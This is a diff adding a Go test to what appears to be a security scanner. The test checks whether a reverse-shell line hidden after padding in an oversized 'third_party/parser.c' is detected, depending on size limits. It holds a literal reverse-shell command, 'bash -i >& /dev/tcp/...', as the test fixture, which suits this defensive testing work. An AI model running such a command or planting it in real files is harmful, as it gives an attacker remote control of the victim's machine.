@@ -119,6 +119,35 @@ func TestLimits(t *testing.T) {
 	}
 }
 
+// A generated parser is code over the per-file limit; it is read up to
+// MaxTextSize, so what it hides is found.
+func TestLargeTextFiles(t *testing.T) {
+	shell := "bash -i >& /dev/tcp/1.2.3.4/1 0>&1\n"
+	big := strings.Repeat("//\n", 1<<10) + shell
+	huge := strings.Repeat("//\n", 4<<10) + shell
+	limits := Limits{MaxFiles: 10, MaxFileSize: 1 << 10, MaxTextSize: 8 << 10}
+	for name, c := range map[string]struct {
+		files   map[string]string
+		limits  Limits
+		found   bool
+		skipped int
+	}{
+		"read up to MaxTextSize":      {map[string]string{"third_party/parser.c": big}, limits, true, 0},
+		"skipped over MaxTextSize":    {map[string]string{"third_party/parser.c": huge}, limits, false, 1},
+		"skipped without MaxTextSize": {map[string]string{"third_party/parser.c": big}, Limits{MaxFiles: 10, MaxFileSize: 1 << 10}, false, 1},
+	} {
+		dir := t.TempDir()
+		write(t, dir, c.files)
+		r, err := Scan(context.Background(), dir, c.limits)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if rulesFound(r)["safety.reverse-shell"] != c.found || r.Skipped != c.skipped {
+			t.Errorf("%s: reverse shell found %v, skipped %d; want %v, %d", name, rulesFound(r)["safety.reverse-shell"], r.Skipped, c.found, c.skipped)
+		}
+	}
+}
+
 func TestValidateURL(t *testing.T) {
 	hosts := []string{"github.com", "gitlab.com"}
 	ok := map[string]string{
